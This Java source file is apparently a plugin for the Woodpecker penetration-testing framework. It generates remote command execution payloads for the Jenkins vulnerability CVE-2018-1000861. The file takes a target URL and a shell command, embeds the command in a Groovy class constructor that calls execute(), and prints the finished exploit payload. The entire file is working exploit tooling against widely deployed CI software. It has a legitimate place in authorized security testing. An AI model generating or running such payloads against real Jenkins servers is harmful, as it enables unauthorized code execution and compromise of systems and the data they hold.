package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JenkinsGroovyPayloadsCVE_2018_1000861 implements IPayloadGenerator {
    @Override
    public String getPayloadTabCaption() {
        return "命令执行payload生成";
    }

    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder usageBinder = JenkinsRCE.pluginHelper.createArgsUsageBinder();
        IArgs url = JenkinsRCE.pluginHelper.createArgs();
        url.setName("url");
        url.setType(IArgs.ARG_TYPE_HTTP_URL);
        url.setRequired(true);
        url.setDefaultValue("http://192.168.1.1/jenkins");
        url.setDescription("目标URL");

        IArgs command = JenkinsRCE.pluginHelper.createArgs();
        command.setName("command");
        command.setType(0);
        command.setRequired(true);
        command.setDefaultValue("whoami");
        command.setDescription("要执行的命令");

        List<IArgs> args = new ArrayList<>();
        args.add(url);
        args.add(command);
        usageBinder.setArgsList(args);
        return usageBinder;
    }

    @Override
    public void generatorPayload(Map<String, String> customArgs, IResultOutput resultOutput) {
        String command = customArgs.get("command");
        String url = customArgs.get("url");
        final String payload = "=public class x {" +
                "public x(){" +
                "\""+command+"\".execute()" +
                "}" +
                "}";
        String finalPayload = JenkinsCommonsUtils.CVE_2018_1000861GeneratePayload(url, payload);
        resultOutput.successPrintln(finalPayload);
    }
}
